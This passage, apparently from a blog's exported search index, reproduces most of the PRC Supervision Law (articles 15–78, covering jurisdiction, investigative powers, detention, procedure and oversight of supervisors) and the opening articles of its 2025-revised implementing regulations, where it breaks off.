（一）中国共产党机关、人民代表大会及其常务委员会机关、人民政府、监察委员会、人民法院、人民检察院、中国人民政治协商会议各级委员会机关、民主党派机关和工商业联合会机关的公务员，以及参照《中华人民共和国公务员法》管理的人员；</p><p>  （二）法律、法规授权或者受国家机关依法委托管理公共事务的组织中从事公务的人员；</p><p>  （三）国有企业管理人员；</p><p>  （四）公办的教育、科研、文化、医疗卫生、体育等单位中从事管理的人员；</p><p>  （五）基层群众性自治组织中从事管理的人员；</p><p>  （六）其他依法履行公职的人员。</p><p>  <strong>第十六条</strong>　各级监察机关按照管理权限管辖本辖区内本法第十五条规定的人员所涉监察事项。</p><p>  上级监察机关可以办理下一级监察机关管辖范围内的监察事项，必要时也可以办理所辖各级监察机关管辖范围内的监察事项。</p><p>  监察机关之间对监察事项的管辖有争议的，由其共同的上级监察机关确定。</p><p>  <strong>第十七条</strong>　上级监察机关可以将其所管辖的监察事项指定下级监察机关管辖，也可以将下级监察机关有管辖权的监察事项指定给其他监察机关管辖。</p><p>  监察机关认为所管辖的监察事项重大、复杂，需要由上级监察机关管辖的，可以报请上级监察机关管辖。</p><h2 id="第四章-监察权限"><a href="#第四章-监察权限" class="headerlink" title="第四章　监察权限"></a>第四章　监察权限</h2><p>  <strong>第十八条</strong>　监察机关行使监督、调查职权，有权依法向有关单位和个人了解情况，收集、调取证据。有关单位和个人应当如实提供。</p><p>  监察机关及其工作人员对监督、调查过程中知悉的国家秘密、商业秘密、个人隐私，应当保密。</p><p>  任何单位和个人不得伪造、隐匿或者毁灭证据。</p><p>  <strong>第十九条</strong>　对可能发生职务违法的监察对象，监察机关按照管理权限，可以直接或者委托有关机关、人员进行谈话，或者进行函询，要求说明情况。</p><p>  <strong>第二十条</strong>　在调查过程中，对涉嫌职务违法的被调查人，监察机关可以进行谈话，要求其就涉嫌违法行为作出陈述，必要时向被调查人出具书面通知。</p><p>对涉嫌贪污贿赂、失职渎职等职务犯罪的被调查人，监察机关可以进行讯问，要求其如实供述涉嫌犯罪的情况。</p><p>  <strong>第二十一条</strong> 监察机关根据案件情况，经依法审批，可以强制涉嫌严重职务违法或者职务犯罪的被调查人到案接受调查。</p><p>  <strong>第二十二条</strong>　在调查过程中，监察机关可以询问证人等人员。</p><p>  <strong>第二十三条</strong> 被调查人涉嫌严重职务违法或者职务犯罪，并有下列情形之一的，经监察机关依法审批，可以对其采取责令候查措施：</p><p>  （一）不具有本法第二十四条第一款所列情形的；</p><p>  （二）符合留置条件，但患有严重疾病、生活不能自理的，系怀孕或者正在哺乳自己婴儿的妇女，或者生活不能自理的人的唯一扶养人；</p><p>  （三）案件尚未办结，但留置期限届满或者对被留置人员不需要继续采取留置措施的；</p><p>  （四）符合留置条件，但因为案件的特殊情况或者办理案件的需要，采取责令候查措施更为适宜的。</p><p>  被责令候查人员应当遵守以下规定：</p><p>  （一）未经监察机关批准不得离开所居住的直辖市、设区的市的城市市区或者不设区的市、县的辖区；</p><p>  （二）住址、工作单位和联系方式发生变动的，在二十四小时以内向监察机关报告；</p><p>  （三）在接到通知的时候及时到案接受调查；</p><p>  （四）不得以任何形式干扰证人作证；</p><p>  （五）不得串供或者伪造、隐匿、毁灭证据。</p><p>  被责令候查人员违反前款规定，情节严重的，可以依法予以留置。</p><p>  <strong>第二十四条</strong>　被调查人涉嫌贪污贿赂、失职渎职等严重职务违法或者职务犯罪，监察机关已经掌握其部分违法犯罪事实及证据，仍有重要问题需要进一步调查，并有下列情形之一的，经监察机关依法审批，可以将其留置在特定场所：</p><p>  （一）涉及案情重大、复杂的；</p><p>  （二）可能逃跑、自杀的；</p><p>  （三）可能串供或者伪造、隐匿、毁灭证据的；</p><p>  （四）可能有其他妨碍调查行为的。</p><p>  对涉嫌行贿犯罪或者共同职务犯罪的涉案人员，监察机关可以依照前款规定采取留置措施。</p><p>  留置场所的设置、管理和监督依照国家有关规定执行。</p><p>  <strong>第二十五条</strong> 对于未被留置的下列人员，监察机关发现存在逃跑、自杀等重大安全风险的，经依法审批，可以进行管护：</p><p>  （一）涉嫌严重职务违法或者职务犯罪的自动投案人员；</p><p>  （二）在接受谈话、函询、询问过程中，交代涉嫌严重职务违法或者职务犯罪问题的人员；</p><p>  （三）在接受讯问过程中，主动交代涉嫌重大职务犯罪问题的人员。</p><p>  采取管护措施后，应当立即将被管护人员送留置场所，至迟不得超过二十四小时。</p><p>  <strong>第二十六条</strong>　监察机关调查涉嫌贪污贿赂、失职渎职等严重职务违法或者职务犯罪，根据工作需要，可以依照规定查询、冻结涉案单位和个人的存款、汇款、债券、股票、基金份额等财产。有关单位和个人应当配合。</p><p>  冻结的财产经查明与案件无关的，应当在查明后三日内解除冻结，予以退还。</p><p>  <strong>第二十七条</strong>　监察机关可以对涉嫌职务犯罪的被调查人以及可能隐藏被调查人或者犯罪证据的人的身体、物品、住处和其他有关地方进行搜查。在搜查时，应当出示搜查证，并有被搜查人或者其家属等见证人在场。</p><p>  搜查女性身体，应当由女性工作人员进行。</p><p>  监察机关进行搜查时，可以根据工作需要提请公安机关配合。公安机关应当依法予以协助。</p><p>  <strong>第二十八条</strong>　监察机关在调查过程中，可以调取、查封、扣押用以证明被调查人涉嫌违法犯罪的财物、文件和电子数据等信息。采取调取、查封、扣押措施，应当收集原物原件，会同持有人或者保管人、见证人，当面逐一拍照、登记、编号，开列清单，由在场人员当场核对、签名，并将清单副本交财物、文件的持有人或者保管人。</p><p>  对调取、查封、扣押的财物、文件，监察机关应当设立专用账户、专门场所，确定专门人员妥善保管，严格履行交接、调取手续，定期对账核实，不得毁损或者用于其他目的。对价值不明物品应当及时鉴定，专门封存保管。</p><p>  查封、扣押的财物、文件经查明与案件无关的，应当在查明后三日内解除查封、扣押，予以退还。</p><p>  <strong>第二十九条</strong>　监察机关在调查过程中，可以直接或者指派、聘请具有专门知识的人在调查人员主持下进行勘验检查。勘验检查情况应当制作笔录，由参加勘验检查的人员和见证人签名或者盖章。</p><p>  必要时，监察机关可以进行调查实验。调查实验情况应当制作笔录，由参加实验的人员签名或者盖章。</p><p>  <strong>第三十条</strong>　监察机关在调查过程中，对于案件中的专门性问题，可以指派、聘请有专门知识的人进行鉴定。鉴定人进行鉴定后，应当出具鉴定意见，并且签名。</p><p>  <strong>第三十一条</strong>　监察机关调查涉嫌重大贪污贿赂等职务犯罪，根据需要，经过严格的批准手续，可以采取技术调查措施，按照规定交有关机关执行。</p><p>  批准决定应当明确采取技术调查措施的种类和适用对象，自签发之日起三个月以内有效；对于复杂、疑难案件，期限届满仍有必要继续采取技术调查措施的，经过批准，有效期可以延长，每次不得超过三个月。对于不需要继续采取技术调查措施的，应当及时解除。</p><p>  <strong>第三十二条</strong>　依法应当留置的被调查人如果在逃，监察机关可以决定在本行政区域内通缉，由公安机关发布通缉令，追捕归案。通缉范围超出本行政区域的，应当报请有权决定的上级监察机关决定。</p><p>  <strong>第三十三条</strong>　监察机关为防止被调查人及相关人员逃匿境外，经省级以上监察机关批准，可以对被调查人及相关人员采取限制出境措施，由公安机关依法执行。对于不需要继续采取限制出境措施的，应当及时解除。</p><p>  <strong>第三十四条</strong>　涉嫌职务犯罪的被调查人主动认罪认罚，有下列情形之一的，监察机关经领导人员集体研究，并报上一级监察机关批准，可以在移送人民检察院时提出从宽处罚的建议：</p><p>  （一）自动投案，真诚悔罪悔过的；</p><p>  （二）积极配合调查工作，如实供述监察机关还未掌握的违法犯罪行为的；</p><p>  （三）积极退赃，减少损失的；</p><p>  （四）具有重大立功表现或者案件涉及国家重大利益等情形的。</p><p>  <strong>第三十五条</strong>　职务违法犯罪的涉案人员揭发有关被调查人职务违法犯罪行为，查证属实的，或者提供重要线索，有助于调查其他案件的，监察机关经领导人员集体研究，并报上一级监察机关批准，可以在移送人民检察院时提出从宽处罚的建议。</p><p>  <strong>第三十六条</strong>　监察机关依照本法规定收集的物证、书证、证人证言、被调查人供述和辩解、视听资料、电子数据等证据材料，在刑事诉讼中可以作为证据使用。</p><p>  监察机关在收集、固定、审查、运用证据时，应当与刑事审判关于证据的要求和标准相一致。</p><p>  以非法方法收集的证据应当依法予以排除，不得作为案件处置的依据。</p><p>  <strong>第三十七条</strong>　人民法院、人民检察院、公安机关、审计机关等国家机关在工作中发现公职人员涉嫌贪污贿赂、失职渎职等职务违法或者职务犯罪的问题线索，应当移送监察机关，由监察机关依法调查处置。</p><p>  被调查人既涉嫌严重职务违法或者职务犯罪，又涉嫌其他违法犯罪的，一般应当由监察机关为主调查，其他机关予以协助。</p><h2 id="第五章-监察程序"><a href="#第五章-监察程序" class="headerlink" title="第五章　监察程序"></a>第五章　监察程序</h2><p>  <strong>第三十八条</strong>　监察机关对于报案或者举报，应当接受并按照有关规定处理。对于不属于本机关管辖的，应当移送主管机关处理。</p><p>  <strong>第三十九条</strong>　监察机关应当严格按照程序开展工作，建立问题线索处置、调查、审理各部门相互协调、相互制约的工作机制。</p><p>  监察机关应当加强对调查、处置工作全过程的监督管理，设立相应的工作部门履行线索管理、监督检查、督促办理、统计分析等管理协调职能。</p><p>  <strong>第四十条</strong>　监察机关对监察对象的问题线索，应当按照有关规定提出处置意见，履行审批手续，进行分类办理。线索处置情况应当定期汇总、通报，定期检查、抽查。</p><p>  <strong>第四十一条</strong>　需要采取初步核实方式处置问题线索的，监察机关应当依法履行审批程序，成立核查组。初步核实工作结束后，核查组应当撰写初步核实情况报告，提出处理建议。承办部门应当提出分类处理意见。初步核实情况报告和分类处理意见报监察机关主要负责人审批。</p><p>  <strong>第四十二条</strong>　经过初步核实，对监察对象涉嫌职务违法犯罪，需要追究法律责任的，监察机关应当按照规定的权限和程序办理立案手续。</p><p>  监察机关主要负责人依法批准立案后，应当主持召开专题会议，研究确定调查方案，决定需要采取的调查措施。</p><p>  立案调查决定应当向被调查人宣布，并通报相关组织。涉嫌严重职务违法或者职务犯罪的，应当通知被调查人家属，并向社会公开发布。</p><p>  <strong>第四十三条</strong>　监察机关对职务违法和职务犯罪案件，应当进行调查，收集被调查人有无违法犯罪以及情节轻重的证据，查明违法犯罪事实，形成相互印证、完整稳定的证据链。</p><p>  调查人员应当依法文明规范开展调查工作。严禁以暴力、威胁、引诱、欺骗及其他非法方式收集证据，严禁侮辱、打骂、虐待、体罚或者变相体罚被调查人和涉案人员。</p><p>  监察机关及其工作人员在履行职责过程中应当依法保护企业产权和自主经营权，严禁利用职权非法干扰企业生产经营。需要企业经营者协助调查的，应当保障其人身权利、财产权利和其他合法权益，避免或者尽量减少对企业正常生产经营活动的影响。</p><p>  <strong>第四十四条</strong>　调查人员采取讯问、询问、强制到案、责令候查、管护、留置、搜查、调取、查封、扣押、勘验检查等调查措施，均应当依照规定出示证件，出具书面通知，由二人以上进行，形成笔录、报告等书面材料，并由相关人员签名、盖章。</p><p>  调查人员进行讯问以及搜查、查封、扣押等重要取证工作，应当对全过程进行录音录像，留存备查。</p><p>  <strong>第四十五条</strong>　调查人员应当严格执行调查方案，不得随意扩大调查范围、变更调查对象和事项。</p><p>  对调查过程中的重要事项，应当集体研究后按程序请示报告。</p><p>  <strong>第四十六条</strong>　采取强制到案、责令候查或者管护措施，应当按照规定的权限和程序，经监察机关主要负责人批准。</p><p>  强制到案持续的时间不得超过十二小时；需要采取管护或者留置措施的，强制到案持续的时间不得超过二十四小时。不得以连续强制到案的方式变相拘禁被调查人。</p><p>  责令候查最长不得超过十二个月。</p><p>  监察机关采取管护措施的，应当在七日以内依法作出留置或者解除管护的决定，特殊情况下可以延长一日至三日。</p><p>  <strong>第四十七条</strong>　监察机关采取留置措施，应当由监察机关领导人员集体研究决定。设区的市级以下监察机关采取留置措施，应当报上一级监察机关批准。省级监察机关采取留置措施，应当报国家监察委员会备案。</p><p>  <strong>第四十八条</strong>　留置时间不得超过三个月。在特殊情况下，可以延长一次，延长时间不得超过三个月。省级以下监察机关采取留置措施的，延长留置时间应当报上一级监察机关批准。监察机关发现采取留置措施不当或者不需要继续采取留置措施的，应当及时解除或者变更为责令候查措施。</p><p>  对涉嫌职务犯罪的被调查人可能判处十年有期徒刑以上刑罚，监察机关依照前款规定延长期限届满，仍不能调查终结的，经国家监察委员会批准或者决定，可以再延长二个月。</p><p>  省级以上监察机关在调查期间，发现涉嫌职务犯罪的被调查人另有与留置时的罪行不同种的重大职务犯罪或者同种的影响罪名认定、量刑档次的重大职务犯罪，经国家监察委员会批准或者决定，自发现之日起依照本条第一款的规定重新计算留置时间。留置时间重新计算以一次为限。</p><p>  <strong>第四十九条</strong> 监察机关采取强制到案、责令候查、管护、留置措施，可以根据工作需要提请公安机关配合。公安机关应当依法予以协助。</p><p>  省级以下监察机关留置场所的看护勤务由公安机关负责，国家监察委员会留置场所的看护勤务由国家另行规定。留置看护队伍的管理依照国家有关规定执行。</p><p>  <strong>第五十条</strong>　采取管护或者留置措施后，应当在二十四小时以内，通知被管护人员、被留置人员所在单位和家属，但有可能伪造、隐匿、毁灭证据，干扰证人作证或者串供等有碍调查情形的除外。有碍调查的情形消失后，应当立即通知被管护人员、被留置人员所在单位和家属。解除管护或者留置的，应当及时通知被管护人员、被留置人员所在单位和家属。</p><p>  被管护人员、被留置人员及其近亲属有权申请变更管护、留置措施。监察机关收到申请后，应当在三日以内作出决定；不同意变更措施的，应当告知申请人，并说明不同意的理由。</p><p>  察机关应当保障被强制到案人员、被管护人员以及被留置人员的饮食、休息和安全，提供医疗服务。对其谈话、讯问的，应当合理安排时间和时长，谈话笔录、讯问笔录由被谈话人、被讯问人阅看后签名。</p><p>  被管护人员、被留置人员涉嫌犯罪移送司法机关后，被依法判处管制、拘役或者有期徒刑的，管护、留置一日折抵管制二日，折抵拘役、有期徒刑一日。</p><p>  <strong>第五十一条</strong> 监察机关在调查工作结束后，应当依法对案件事实和证据、性质认定、程序手续、涉案财物等进行全面审理，形成审理报告，提请集体审议。</p><p>  <strong>第五十二条</strong>　监察机关根据监督、调查结果，依法作出如下处置：</p><p>  （一）对有职务违法行为但情节较轻的公职人员，按照管理权限，直接或者委托有关机关、人员，进行谈话提醒、批评教育、责令检查，或者予以诫勉；</p><p>  （二）对违法的公职人员依照法定程序作出警告、记过、记大过、降级、撤职、开除等政务处分决定；</p><p>  （三）对不履行或者不正确履行职责负有责任的领导人员，按照管理权限对其直接作出问责决定，或者向有权作出问责决定的机关提出问责建议；</p><p>  （四）对涉嫌职务犯罪的，监察机关经调查认为犯罪事实清楚，证据确实、充分的，制作起诉意见书，连同案卷材料、证据一并移送人民检察院依法审查、提起公诉；</p><p>  （五）对监察对象所在单位廉政建设和履行职责存在的问题等提出监察建议。</p><p>监察机关经调查，对没有证据证明被调查人存在违法犯罪行为的，应当撤销案件，并通知被调查人所在单位。</p><p>  <strong>第五十三条</strong>　监察机关经调查，对违法取得的财物，依法予以没收、追缴或者责令退赔；对涉嫌犯罪取得的财物，应当随案移送人民检察院。</p><p>  <strong>第五十四条</strong>　对监察机关移送的案件，人民检察院依照《 中华人民共和国刑事诉讼法》对被调查人采取强制措施。</p><p>  人民检察院经审查，认为犯罪事实已经查清，证据确实、充分，依法应当追究刑事责任的，应当作出起诉决定。</p><p>  人民检察院经审查，认为需要补充核实的，应当退回监察机关补充调查，必要时可以自行补充侦查。对于补充调查的案件，应当在一个月内补充调查完毕。补充调查以二次为限。</p><p>  人民检察院对于有《中华人民共和国刑事诉讼法》规定的不起诉的情形的，经上一级人民检察院批准，依法作出不起诉的决定。监察机关认为不起诉的决定有错误的，可以向上一级人民检察院提请复议。</p><p>  <strong>第五十五条</strong>　监察机关在调查贪污贿赂、失职渎职等职务犯罪案件过程中，被调查人逃匿或者死亡，有必要继续调查的，应当继续调查并作出结论。被调查人逃匿，在通缉一年后不能到案，或者死亡的，由监察机关提请人民检察院依照法定程序，向人民法院提出没收违法所得的申请。</p><p>  <strong>第五十六条</strong>　监察对象对监察机关作出的涉及本人的处理决定不服的，可以在收到处理决定之日起一个月内，向作出决定的监察机关申请复审，复审机关应当在一个月内作出复审决定；监察对象对复审决定仍不服的，可以在收到复审决定之日起一个月内，向上一级监察机关申请复核，复核机关应当在二个月内作出复核决定。复审、复核期间，不停止原处理决定的执行。复核机关经审查，认定处理决定有错误的，原处理机关应当及时予以纠正。</p><h2 id="第六章-反腐败国际合作"><a href="#第六章-反腐败国际合作" class="headerlink" title="第六章　反腐败国际合作"></a>第六章　反腐败国际合作</h2><p>  <strong>第五十七条</strong>　国家监察委员会统筹协调与其他国家、地区、国际组织开展的反腐败国际交流、合作，组织反腐败国际条约实施工作。</p><p>  <strong>第五十八条</strong>　国家监察委员会会同有关单位加强与有关国家、地区、国际组织在反腐败方面开展引渡、移管被判刑人、遣返、联合调查、调查取证、资产追缴和信息交流等执法司法合作和司法协助。</p><p>  <strong>第五十九条</strong>　国家监察委员会加强对反腐败国际追逃追赃和防逃工作的组织协调，督促有关单位做好相关工作：</p><p>  （一）对于重大贪污贿赂、失职渎职等职务犯罪案件，被调查人逃匿到国（境）外，掌握证据比较确凿的，通过开展境外追逃合作，追捕归案；</p><p>  （二）向赃款赃物所在国请求查询、冻结、扣押、没收、追缴、返还涉案资产；</p><p>  （三）查询、监控涉嫌职务犯罪的公职人员及其相关人员进出国（境）和跨境资金流动情况，在调查案件过程中设置防逃程序。</p><h2 id="第七章-对监察机关和监察人员的监督"><a href="#第七章-对监察机关和监察人员的监督" class="headerlink" title="第七章　对监察机关和监察人员的监督"></a>第七章　对监察机关和监察人员的监督</h2><p>  <strong>第六十条</strong>　各级监察委员会应当接受本级人民代表大会及其常务委员会的监督。</p><p>  各级人民代表大会常务委员会听取和审议本级监察委员会的专项工作报告，组织执法检查。</p><p>  县级以上各级人民代表大会及其常务委员会举行会议时，人民代表大会代表或者常务委员会组成人员可以依照法律规定的程序，就监察工作中的有关问题提出询问或者质询。</p><p>  <strong>第六十一条</strong>　监察机关应当依法公开监察工作信息，接受民主监督、社会监督、舆论监督。</p><p>  <strong>第六十二条</strong> 监察机关根据工作需要，可以从各方面代表中聘请特约监察员。特约监察员按照规定对监察机关及其工作人员履行职责情况实行监督。</p><p>  <strong>第六十三条</strong>　监察机关通过设立内部专门的监督机构等方式，加强对监察人员执行职务和遵守法律情况的监督，建设忠诚、干净、担当的监察队伍。</p><p>  <strong>第六十四条</strong> 监察人员涉嫌严重职务违法或者职务犯罪，为防止造成更为严重的后果或者恶劣影响，监察机关经依法审批，可以对其采取禁闭措施。禁闭的期限不得超过七日。</p><p>  被禁闭人员应当配合监察机关调查。监察机关经调查发现被禁闭人员符合管护或者留置条件的，可以对其采取管护或者留置措施。</p><p>  本法第五十条的规定，适用于禁闭措施。</p><p>  <strong>第六十五条</strong>　监察人员必须模范遵守宪法和法律，忠于职守、秉公执法，清正廉洁、保守秘密；必须具有良好的政治素质，熟悉监察业务，具备运用法律、法规、政策和调查取证等能力，自觉接受监督。</p><p>  <strong>第六十六条</strong>　对于监察人员打听案情、过问案件、说情干预的，办理监察事项的监察人员应当及时报告。有关情况应当登记备案。</p><p>  发现办理监察事项的监察人员未经批准接触被调查人、涉案人员及其特定关系人，或者存在交往情形的，知情人应当及时报告。有关情况应当登记备案。</p><p>  <strong>第六十七条</strong>　办理监察事项的监察人员有下列情形之一的，应当自行回避，监察对象、检举人及其他有关人员也有权要求其回避：</p><p>  （一）是监察对象或者检举人的近亲属的；</p><p>  （二）担任过本案的证人的；</p><p>  （三）本人或者其近亲属与办理的监察事项有利害关系的；</p><p>  （四）有可能影响监察事项公正处理的其他情形的。</p><p>  <strong>第六十八条</strong>　监察机关涉密人员离岗离职后，应当遵守脱密期管理规定，严格履行保密义务，不得泄露相关秘密。</p><p>  监察人员辞职、退休三年内，不得从事与监察和司法工作相关联且可能发生利益冲突的职业。</p><p>  <strong>第六十九条</strong>　监察机关及其工作人员有下列行为之一的，被调查人及其近亲属、利害关系人有权向该机关申诉：</p><p>  （一）采取强制到案、责令候查、管护、留置或者禁闭措施法定期限届满，不予以解除或者变更的；</p><p>  （二）查封、扣押、冻结与案件无关或者明显超出涉案范围的财物的；</p><p>  （三）应当解除查封、扣押、冻结措施而不解除的；</p><p>  （四）贪污、挪用、私分、调换或者违反规定使用查封、扣押、冻结的财物的；</p><p>  （五）利用职权非法干扰企业生产经营或者侵害企业经营者人身权利、财产权利和其他合法权益的；</p><p>  （六）其他违反法律法规、侵害被调查人合法权益的行为。</p><p>  受理申诉的监察机关应当在受理申诉之日起一个月内作出处理决定。申诉人对处理决定不服的，可以在收到处理决定之日起一个月内向上一级监察机关申请复查，上一级监察机关应当在收到复查申请之日起二个月内作出处理决定，情况属实的，及时予以纠正。</p><p>  <strong>第七十条</strong>　对调查工作结束后发现立案依据不充分或者失实，案件处置出现重大失误，监察人员严重违法的，应当追究负有责任的领导人员和直接责任人员的责任。</p><h2 id="第八章-法律责任"><a href="#第八章-法律责任" class="headerlink" title="第八章　法律责任"></a>第八章　法律责任</h2><p>  <strong>第七十一条</strong>　有关单位拒不执行监察机关作出的处理决定，或者无正当理由拒不采纳监察建议的，由其主管部门、上级机关责令改正，对单位给予通报批评；对负有责任的领导人员和直接责任人员依法给予处理。</p><p>  <strong>第七十二条</strong>　有关人员违反本法规定，有下列行为之一的，由其所在单位、主管部门、上级机关或者监察机关责令改正，依法给予处理：</p><p>  （一）不按要求提供有关材料，拒绝、阻碍调查措施实施等拒不配合监察机关调查的；</p><p>  （二）提供虚假情况，掩盖事实真相的；</p><p>  （三）串供或者伪造、隐匿、毁灭证据的；</p><p>  （四）阻止他人揭发检举、提供证据的；</p><p>  （五）其他违反本法规定的行为，情节严重的。</p><p>  <strong>第七十三条</strong>　监察对象对控告人、检举人、证人或者监察人员进行报复陷害的；控告人、检举人、证人捏造事实诬告陷害监察对象的，依法给予处理。</p><p>  <strong>第七十四条</strong>　监察机关及其工作人员有下列行为之一的，对负有责任的领导人员和直接责任人员依法给予处理：</p><p>  （一）未经批准、授权处置问题线索，发现重大案情隐瞒不报，或者私自留存、处理涉案材料的；</p><p>  （二）利用职权或者职务上的影响干预调查工作、以案谋私的；</p><p>  （三）违法窃取、泄露调查工作信息，或者泄露举报事项、举报受理情况以及举报人信息的；</p><p>  （四）对被调查人或者涉案人员逼供、诱供，或者侮辱、打骂、虐待、体罚或者变相体罚的；</p><p>  （五）违反规定处置查封、扣押、冻结的财物的；</p><p>  （六）违反规定发生办案安全事故，或者发生安全事故后隐瞒不报、报告失实、处置不当的；</p><p>  （七）违反规定采取强制到案、责令候查、管护、留置或者禁闭措施，或者法定期限届满，不予以解除或者变更的；</p><p>  （八）违反规定采取技术调查、限制出境措施，或者不按规定解除技术调查、限制出境措施的；</p><p>  （九）利用职权非法干扰企业生产经营或者侵害企业经营者人身权利、财产权利和其他合法权益的；</p><p>  （十）其他滥用职权、玩忽职守、徇私舞弊的行为</p><p>  <strong>第七十五条</strong>　违反本法规定，构成犯罪的，依法追究刑事责任。</p><p><strong>  第七十六条</strong>　监察机关及其工作人员行使职权，侵犯公民、法人和其他组织的合法权益造成损害的，依法给予国家赔偿。</p><h2 id="第九章-附-则"><a href="#第九章-附-则" class="headerlink" title="第九章　附　则"></a>第九章　附　则</h2><p>  <strong>第七十七条</strong>　中国人民解放军和中国人民武装警察部队开展监察工作，由中央军事委员会根据本法制定具体规定。</p><p><strong>  第七十八条</strong>　本法自公布之日起施行。《中华人民共和国行政监察法》同时废止。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华人民共和国监察法实施条例（2021年9月20日）</title>
      <link href="/2025/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%9B%91%E5%AF%9F%E6%B3%95%E5%AE%9E%E6%96%BD%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B49%E6%9C%8820%E6%97%A5%EF%BC%89/"/>
      <url>/2025/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%9B%91%E5%AF%9F%E6%B3%95%E5%AE%9E%E6%96%BD%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B49%E6%9C%8820%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>（2021年7月20日国家监察委员会全体会议决定 2021年9月20日国家监察委员会公告第1号公布 2025年4月27日国家监察委员会全体会议修订 2025年6月1日国家监察委员会公告第2号公布）<br><strong>目    录</strong><br>第一章  总    则<br>第二章  监察机关及其职责<br>第三章  监察范围和管辖<br>第四章  监察权限<br>第五章  监察程序<br>第六章  反腐败国际合作<br>第七章  对监察机关和监察人员的监督<br>第八章  法律责任<br>第九章  附    则</p><h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章  总    则"></a>第一章  总    则</h2><p>  第一条  为了推动监察工作法治化、规范化，保障依法公正行使监察权，根据《中华人民共和国监察法》（以下简称监察法），结合工作实际，制定本条例。</p><p>  第二条  坚持中国共产党对监察工作的全面领导，增强政治意识、大局意识、核心意识、看齐意识，坚定中国特色社会主义道路自信、理论自信、制度自信、文化自信，坚决维护习近平总书记党中央的核心、全党的核心地位，坚决维护以习近平同志为核心的党中央权威和集中统一领导，把党的领导贯彻到监察工作各方面和全过程。</p><p>  第三条  监察机关与党的纪律检查机关合署办公，坚持法治思维和法治方式，促进执纪执法贯通、有效衔接司法，实现依纪监督和依法监察、适用纪律和适用法律有机融合。</p><p>  第四条  监察机关应当依法履行监督、调查、处置职责，坚持实事求是，坚持惩前毖后、治病救人，坚持惩戒与教育相结合，实现政治效果、法律效果和社会效果相统一。</p><p>  第五条  监察机关应当坚定不移惩治腐败，推动深化改革、完善制度，规范权力运行，加强新时代廉洁文化建设，引导公职人员提高觉悟、担当作为、依法履职，一体推进不敢腐、不能腐、不想腐，着力铲除腐败滋生的土壤和条件。</p><p>  第六条  监察机关坚持民主集中制，对于线索处置、立案调查、案件审理、处置执行、复审复核中的重要事项应当集体研究，严格按照权限履行请示报告程序。</p><p>  第七条  监察机关应当尊重和保障人权，在适用法律上一律平等，充分保障监察对象以及相关人员的人身权、知情权、财产权、申辩权、申诉权以及申请复审复核权等合法权益。</p><p>  第八条  监察机关办理职务犯罪案件，应当与人民法院、人民检察院互相配合、互相制约，在案件管辖、证据审查、案件移送、涉案财物处置等方面加强沟通协调，对于人民法院、人民检察院提出的退回补充调查、排除非法证据、调取同步录音录像、要求调查人员出庭等意见依法办理。</p><p>  第九条  监察机关开展监察工作，可以依法提请组织人事、公安、国家安全、移民管理、审计、统计、市场监管、金融监管、财政、税务、自然资源、银行、证券、保险等有关部门、单位予以协助配合。</p><p>  有关部门、单位应当根据监察机关的要求，依法协助采取有关措施、共享相关信息、提供相关资料和专业技术支持，配合开展监察工作。</p><h2 id="第二章-监察机关及其职责"><a href="#第二章-监察机关及其职责" class="headerlink" title="第二章  监察机关及其职责"></a>第二章  监察机关及其职责</h2><p>  <strong>第一节  领导体制</strong></p><p>  第十条  国家监察委员会在党中央领导下开展工作。地方各级监察委员会在同级党委和上级监察委员会双重领导下工作，监督执法调查工作以上级监察委员会领导为主，线索处置和案件查办在向同级党委报告的同时应当一并向上一级监察委员会报告。</p><p>  上级监察委员会应当加强对下级监察委员会的领导。下级监察委员会对上级监察委员会的决定必须执行，认为决定不当的，应当在执行的同时向上级监察委员会反映。上级监察委员会对下级监察委员会作出的错误决定，应当按程序予以纠正，或者要求下级监察委员会予以纠正。</p><p>  第十一条  上级监察委员会可以依法统一调用所辖各级监察机关的监察人员办理监察事项。调用决定应当以书面形式作出。</p><p>  监察机关办理监察事项应当加强互相协作和配合，对于重要、复杂事项可以提请上级监察机关予以协调。</p><p>  第十二条  各级监察委员会依法向本级中国共产党机关、国家机关、中国人民政治协商会议委员会机关、法律法规授权或者受委托管理公共事务的组织和单位以及所管辖的国有企业、事业单位等派驻或者派出监察机构、监察专员。</p><p>  省级和设区的市级监察委员会依法向地区、盟、开发区等不设置人民代表大会的区域派出监察机构或者监察专员。县级监察委员会和直辖市所辖区（县）监察委员会可以向街道、乡镇等区域派出监察机构或者监察专员。</p><p>  监察机构、监察专员开展监察工作，受派出机关领导。</p><p>  第十三条  各级监察委员会派驻或者派出的监察机构、监察专员根据派出机关授权，按照管理权限依法对派驻或者派出监督单位、区域等的公职人员开展监督，对职务违法和职务犯罪进行调查、处置。监察机构、监察专员可以按规定与地方监察委员会联合调查严重职务违法、职务犯罪，或者移交地方监察委员会调查。</p><p>  前款规定的监察机构、监察专员未被授予职务犯罪调查权的，其发现监察对象涉嫌职务犯罪线索，应当及时向派出机关报告，由派出机关调查或者依法移交有关地方监察委员会调查。</p><p>  第十四条  经国家监察委员会批准，国家监察委员会有关派驻监察机构、监察专员可以按照监察法第十二条第二款、第三款规定再派出。</p><p>  再派出监察机构、监察专员开展监察工作，受派出它的监察机构、监察专员领导。</p><p>  再派出监察机构、监察专员根据授权，按照管理权限依法对再派出监督单位的公职人员开展监督，对职务违法进行调查、处置。职务犯罪的调查、处置，按照本条例第五十二条第二款规定办理。</p><p>  <strong>第二节  监察监督</strong></p><p>  第十五条  监察机关依法履行监察监督职责，对公职人员政治品行、行使公权力和道德操守情况进行监督检查，督促有关机关、单位加强对所属公职人员的教育、管理、监督。</p><p>  第十六条  监察机关应当坚决维护宪法确立的国家指导思想，加强对公职人员特别是领导人员坚持党的领导、坚持中国特色社会主义制度，贯彻落实党和国家路线方针政策、重大决策部署，履行从严管理监督职责，依法行使公权力等情况的监督。</p><p>  第十七条  